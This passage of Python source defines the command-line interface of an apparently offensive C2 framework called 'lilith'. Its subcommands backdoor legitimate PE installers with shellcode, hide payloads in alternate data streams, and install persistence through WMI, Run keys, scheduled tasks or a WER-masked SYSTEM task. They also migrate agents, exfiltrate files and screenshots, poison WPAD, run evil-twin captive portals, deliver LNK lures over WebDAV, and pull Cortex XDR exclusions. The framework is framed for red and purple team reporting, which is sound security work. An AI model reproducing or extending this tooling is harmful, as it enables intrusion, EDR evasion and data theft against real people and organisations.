    build_p.add_argument("--ads-host",      metavar="FILE",  dest="ads_host",  default=None,
                         help="Host file for ADS (default: randomised from preset signed system binaries)")
    build_p.add_argument("--ads-stream",    metavar="NAME",  dest="ads_stream", default=None,
                         help="ADS stream name (default: randomised)")

    serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
    serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
    serve_p.add_argument("--mgmt-port", type=int, metavar="PORT", dest="mgmt_port",
                         help="Management API port for 'lilith c2' (default 8444)")
    serve_p.add_argument("--ui-token",  metavar="TOKEN", dest="ui_token", default="",
                         help="Operator token for web UI auth (empty = no auth)")

    patch_p = sub.add_parser("patch", help="Backdoor a PE installer with the C2 stager shellcode")
    patch_p.add_argument("--target",  required=True,  metavar="EXE",  help="Legitimate PE to backdoor (not modified in place)")
    patch_p.add_argument("--output",  required=True,  metavar="EXE",  help="Output path for backdoored PE")
    patch_p.add_argument("--section", metavar="NAME",                 help="Section name override (randomised if omitted)")
    patch_p.add_argument("--sc",      metavar="BIN",                  help="Pre-built raw shellcode file (skip donut step)")

    c2_p = sub.add_parser("c2", help="Interact with active C2 agent sessions")
    c2_p.add_argument("--list",    action="store_true",  help="List active sessions")
    c2_p.add_argument("--session", metavar="ID",         help="Session ID to interact with")
    c2_p.add_argument("--cmd",     metavar="CMD",        help="One-shot command (prints result and exits)")
    c2_p.add_argument("--timeout", metavar="SEC", type=int,
                      help="Result wait timeout in seconds (default: c2_timeout_s from config, or 50)")
    c2_p.add_argument("--migrate", metavar="PROC", nargs="?", const="",
                      help="Migrate agent to another process (optional: target process name, e.g. svchost.exe)")
    c2_p.add_argument("--persist", metavar="TYPE", choices=["wmi", "run", "schtask", "wer"],
                      help="Install persistence: wmi (admin, WMI subscription) | "
                           "run (user, HKCU Run key) | schtask (user, logon task) | "
                           "wer (admin/SYSTEM, WER-masked SYSTEM task at boot)")
    c2_p.add_argument("--kill",       metavar="SID",
                      help="Remove a session from the registry (use after migration to clean up old session)")
    c2_p.add_argument("--upload",     metavar=("LOCAL", "REMOTE"), nargs=2,
                      help="Stage LOCAL file on C2 server and push upload task to agent (writes to REMOTE path on target)")
    c2_p.add_argument("--download",   metavar="REMOTE",
                      help="Pull REMOTE file from target via agent (returns base64-decoded binary)")
    c2_p.add_argument("--screenshot", action="store_true",
                      help="Capture target desktop via GDI and save as BMP")
    c2_p.add_argument("--out",        metavar="FILE",
                      help="Output path for --download / --screenshot (default: basename or screenshot.bmp)")

    net_p     = sub.add_parser("network", help="Network-level delivery: captive portal, WPAD poisoning")
    net_sub   = net_p.add_subparsers(dest="net_cmd", metavar="mode")

    cap_p = net_sub.add_parser("captive", help="Evil twin + captive portal (auto-opens browser on WiFi connect)")
    cap_p.add_argument("--iface",    required=True, metavar="IFACE",
                       help="Wireless interface for rogue AP (e.g. wlan1)")
    cap_p.add_argument("--ssid",     metavar="SSID",  default="Corp_Guest",
                       help="SSID of rogue AP (default: Corp_Guest)")
    cap_p.add_argument("--cap-port", metavar="PORT",  dest="cap_port", type=int, default=80,
                       help="HTTP port for captive portal server (default: 80)")

    wpad_p = net_sub.add_parser("wpad", help="WPAD poisoning + injecting HTTP proxy")
    wpad_p.add_argument("--pac-port",   metavar="PORT", dest="pac_port",   type=int, default=80,
                        help="Port to serve wpad.dat on (default: 80)")
    wpad_p.add_argument("--proxy-port", metavar="PORT", dest="proxy_port", type=int, default=8080,
                        help="Port for injecting HTTP proxy (default: 8080)")

    webdav_p = net_sub.add_parser("webdav", help="WebDAV server for search-ms: LNK delivery")
    webdav_p.add_argument("--lnk-path",    metavar="FILE", dest="lnk_path",    default=None,
                          help="Path to .lnk payload file (default: <workspace>/payload.lnk)")
    webdav_p.add_argument("--lnk-name",    metavar="NAME", dest="lnk_name",    default="Critical Update",
                          help="Display name shown in Explorer search results (default: Critical Update)")
    webdav_p.add_argument("--webdav-port", metavar="PORT", dest="webdav_port", type=int, default=None,
                          help="HTTP port for WebDAV server (default: webdav_port from config, or 8080)")

    xdr_p = sub.add_parser("xdr", help="Parse Cortex XDR agent_settings.db for exclusions and uninstall hash")
    xdr_p.add_argument("--parse", metavar="DB_DIR", dest="db_dir", required=True,
                       help="Path to agent_settings.db directory (e.g. pulled from target via 'download')")

    eng_p = sub.add_parser("engage",
                            help="Query / export the engagement database for purple team reporting")
    eng_p.add_argument("--list-tasks",  action="store_true", dest="list_tasks",
                       help="List all dispatched tasks with ATT&CK technique mapping")
    eng_p.add_argument("--session",     metavar="SID",
                       help="Filter --list-tasks to a specific session ID")
    eng_p.add_argument("--tag",         metavar=("SID", "LABEL"), nargs=2,
                       help="Annotate a session with a label (hostname, user, role)")
    eng_p.add_argument("--add-note",    metavar=("TASK_ID", "TEXT"), nargs=2, dest="add_note",
                       help="Attach an operator note to a specific task result")
    eng_p.add_argument("--export",      metavar="FORMAT",
                       help="Export engagement data: json | md (Markdown with ATT&CK mapping)")
    eng_p.add_argument("--out",         metavar="FILE",
                       help="Output file for --export (default: engagement_report.json / .md)")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(0)

    cfg = load_config()
    ws  = Workspace()

    dispatch = {
        "init":    cmd_init,
        "build":   cmd_build,
        "serve":   cmd_serve,
        "list":    cmd_list,
        "check":   cmd_check,
        "c2":      cmd_c2,
        "patch":   cmd_patch,
        "network": cmd_network,
        "xdr":     cmd_xdr,
        "engage":  cmd_engage,
    }
    dispatch[args.command](args, cfg, ws)


if __name__ == "__main__":
    main()
